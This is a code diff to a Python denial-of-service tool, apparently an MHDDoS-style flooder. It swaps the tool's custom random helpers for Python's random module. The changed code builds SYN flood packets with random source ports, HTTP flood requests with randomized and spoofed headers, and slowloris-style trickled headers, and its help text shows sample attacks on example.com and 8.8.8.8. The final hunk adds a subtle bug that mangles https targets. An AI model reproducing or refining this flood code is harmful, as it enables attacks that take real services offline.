@@ -6,6 +6,7 @@ from json import load
 from math import trunc, log2
 from os import urandom as randbytes
 from pathlib import Path
+from random import randint, choice as randchoice
 from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
                     SOCK_DGRAM, SOCK_RAW, gethostname, gethostbyname)
 from ssl import SSLContext, create_default_context, CERT_NONE
@@ -172,7 +173,7 @@ class Layer4(Thread):
         tcp: TCP = TCP()
         tcp.set_SYN()
         tcp.set_th_dport(self._target[1])
-        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
+        tcp.set_th_sport(randint(1, 65535))
         ip.contains(tcp)
         return ip.get_packet()
 
@@ -299,8 +300,8 @@ class HttpFlood(Thread):
     @property
     def randHeadercontent(self) -> str:
         payload: str = ""
-        payload += f"User-Agent: {ProxyTools.Random.rand_choice(*self._useragents)}\r\n"
-        payload += f"Referrer: {ProxyTools.Random.rand_choice(*self._referers)}{parse.quote(self._target.human_repr())}\r\n"
+        payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
+        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
         payload += self.SpoofIP
         return payload
 
@@ -338,7 +339,7 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload("Cookie: _ga=GA%s;"
                                                " _gat=1;"
                                                " __cfduid=dc232334gwdsd23434542342342342475611928;"
-                                               " %s=%s\r\n" % (ProxyTools.Random.rand_int(1000, 99999),
+                                               " %s=%s\r\n" % (randint(1000, 99999),
                                                                ProxyTools.Random.rand_str(6),
                                                                ProxyTools.Random.rand_str(32)))
 
@@ -454,7 +455,7 @@ class HttpFlood(Thread):
                 s.send(payload)
             while s.send(payload) and s.recv(1):
                 for i in range(self._rpc):
-                    s.send(str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000)))
+                    s.send(str.encode("X-a: %d\r\n" % randint(1, 5000)))
                     sleep(self._rpc / 15)
                 break
 
@@ -711,17 +712,17 @@ class ToolsConsole:
                                                         ", ".join(["TOOLS", "HELP", "STOP"]), 3,
                                                         len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
                                                         argv[0],
-                                                        ProxyTools.Random.rand_choice(*Methods.LAYER7_METHODS),
+                                                        randchoice([*Methods.LAYER7_METHODS]),
                                                         "https://example.com",
-                                                        ProxyTools.Random.rand_choice([4, 5, 1, 0]),
-                                                        ProxyTools.Random.rand_int(850, 1000),
-                                                        ProxyTools.Random.rand_int(50, 100),
-                                                        ProxyTools.Random.rand_int(1000, 3600),
+                                                        randchoice([4, 5, 1, 0]),
+                                                        randint(850, 1000),
+                                                        randint(50, 100),
+                                                        randint(1000, 3600),
                                                         argv[0],
-                                                        ProxyTools.Random.rand_choice(*Methods.LAYER4_METHODS),
+                                                        randchoice([*Methods.LAYER4_METHODS]),
                                                         "8.8.8.8:80",
-                                                        ProxyTools.Random.rand_int(850, 1000),
-                                                        ProxyTools.Random.rand_int(1000, 3600)
+                                                        randint(850, 1000),
+                                                        randint(1000, 3600)
                                                         ))
 
     # noinspection PyUnreachableCode
@@ -748,7 +749,7 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER7_METHODS:
                     urlraw = argv[2].strip()
-                    if not urlraw.startswith("http"): urlraw = "http://" + urlraw
+                    if not urlraw.startswith("http://"): urlraw = "http://" + urlraw
                     url = URL(urlraw)
                     threads = int(argv[4])
                     rpc = int(argv[6])
